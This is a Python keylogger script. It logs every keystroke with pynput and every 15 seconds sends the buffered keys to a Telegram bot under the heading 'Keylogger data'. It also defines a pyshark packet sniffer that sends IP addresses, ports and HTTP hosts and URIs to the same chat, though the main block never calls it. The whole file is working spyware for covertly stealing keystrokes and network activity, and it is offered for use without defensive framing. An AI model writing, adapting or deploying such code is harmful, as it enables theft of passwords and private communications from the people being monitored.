from pynput import keyboard
import time
import requests
import pyshark
import asyncio

# instead of email, use telegram instead for real time monitoring
def send_to_telegram(token, chat_id, message):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {'chat_id': chat_id, 'text': message}
    try:
        requests.post(url, data=payload)
    except requests.RequestException as e:
        print(f"Error sending message to Telegram: {e}")

# add telegram bot detail here
TELEGRAM_TOKEN = "BOT TOKEN HERE"
CHAT_ID = "CHAT ID HERE"

# buffer to store key logs to increase performance
log_buffer = []

# time variables for delay
SEND_INTERVAL = 15
last_sent_time = time.time()

def key_pressed(key):
    global last_sent_time, log_buffer
    try:
        char = key.char
        if char:
            log_buffer.append(char)
    except AttributeError:
        special_key = f"[{key}]"
        log_buffer.append(special_key)
    
    # time delay for sending logged keys to telegram
    if time.time() - last_sent_time >= SEND_INTERVAL:
        if log_buffer:
            # Send the log data via Telegram
            message = ''.join(log_buffer)
            send_to_telegram(TELEGRAM_TOKEN, CHAT_ID, f"Keylogger data:\n{message}")
            log_buffer.clear()  # Clear the buffer after sending
            last_sent_time = time.time()

# for monitoring network packets
def capture_packets():
    asyncio.set_event_loop(asyncio.new_event_loop())  # for threading later
    try:
        # replace interface variable with the interface you want to monitor
        capture = pyshark.LiveCapture(interface='Wi-Fi')  
        print("[*] Starting packet capture on Wi-Fi...")

        for packet in capture.sniff_continuously():
            try:
                # extract common packet details
                if 'IP' in packet:
                    src = packet.ip.src
                    dst = packet.ip.dst
                    proto = packet.highest_layer
                    details = f"Packet: {proto} from {src} to {dst}"

                    # deeper inspection scan for tcp and http 
                    if 'TCP' in packet:
                        details += f", TCP Src Port: {packet.tcp.srcport}, Dst Port: {packet.tcp.dstport}"
                    if 'HTTP' in packet:
                        details += f", HTTP Host: {packet.http.host}, URI: {packet.http.request_uri}"

                    print(details)
                    send_to_telegram(TELEGRAM_TOKEN, CHAT_ID, details)

            except AttributeError as e:
                print(f"Error processing packet: {e}")
    except Exception as e:
        print(f"Error starting capture: {e}")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    listener.join()  

